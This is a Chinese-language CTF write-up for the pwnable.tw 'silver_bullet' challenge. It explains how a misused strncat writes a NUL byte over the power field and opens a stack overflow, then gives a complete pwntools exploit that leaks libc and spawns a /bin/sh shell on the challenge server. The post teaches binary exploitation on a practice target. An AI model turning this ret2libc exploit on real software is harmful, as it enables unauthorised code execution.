---
Layout: Post
title: pwnable.tw silver_bullet
date: 2022-08-07 09:28:56
---

Off-by-NULL
<!-- more -->

## 功能描述

循环打印一个菜单，可以选择生成子弹、升级子弹、攻击BOSS（成功了才能return）、或者exit(0)
推测子弹结构如下：

```c
typedef struct _Bullet {
    char description[0x30];
    unsigned int power;
}
```

生成子弹和升级子弹时，都会提示输入 `description` ，然后对输入的 `description` 使用 `strlen`，加到 `power` 上。
在升级子弹时，description的大小限制为 `0x30-power`，读取到 `power_up` 的栈帧上。在更新 `power` 后将会用 `strncat()` 将新的 `description` 加到原来的 `description` 之后。

## 漏洞

本题漏洞是对于 `strncat` 的误用。
假设上述 `description` 已经有 0x2f 个字符，那么在 `power_up` 函数中，会限制只能读取一个字符。
然而在复制字符串时，`strncat`不仅会把 `description[0x2f]` 覆盖成该字符，还会把后面的 `description[0x30]` 修改成 `\0`。

也就是说，虽说 `strncat` 有一个大小限制 $n$ 的参数，但这个 $n$ **并不能保证参数中的 `dest` 字符串只有 $n$ 个字符被修改**，而是指**参数中的 `src` 字符串至多有多长**！
在本题中，程序并没有考虑到这一点，因此可以把正好位于 `description[0x30]` 的 `power` 最低位覆盖为 `\0`。如此一来，在下一次 `power_up` 时，我们就可以从 `power` 这个变量开始，输入 0x30 个字符，达成栈溢出攻击。

## 利用

由于只能一次输入，因此我选择泄露libc的 `puts` 之后(打败boss来正常return)，调用 `_start` 重开，在新的一轮中再实施攻击，拿到shell。

exp:

```python
from pwn import *
context.arch='i386'
# context.log_level='debug'

filename="./silver_bullet"
io = process([filename], env={"LD_PRELOAD":"./libc_32.so.6"})
elf=ELF(filename)

libc_name="./libc_32.so.6"
libc=ELF(libc_name)

io = remote("chall.pwnable.tw", 10103)

def dbg():
    g = gdb.attach(io)

def rop(payload):
    io.send(b'1')
    io.recv()
    io.send(b'\xff'*47)
    io.recv()

    io.send(b'2')
    io.recv()
    io.send(b'\xff')
    io.recv()

    io.send(b'2')
    io.recv()
    io.send(b'\xff'*7 + payload) # 之所以这里是7而不是8，因为在strncat的时候power最低位已经有值了，所以只需要用3个字符填充power，4个字符填充saved rbp
    io.recv()

    io.send(b'3')

# leak libc
payload = b''
payload += pack(elf.plt['puts'])
payload += pack(elf.symbols['_start'])
payload += pack(elf.got['puts'])

rop(payload)
mes = io.recvrepeat(5)
pos = mes.find(b'You win !!\n') + len('You win !!\n')
libc_base = unpack(mes[pos:pos+4]) - libc.symbols['puts']

# system('/bin/sh')
payload = b''
payload += pack(libc_base + libc.symbols['system'])
payload += pack(libc_base + libc.symbols['system'])
payload += pack(libc_base + 0x00158e8b) # "/bin/sh"

rop(payload)
io.interactive()
```
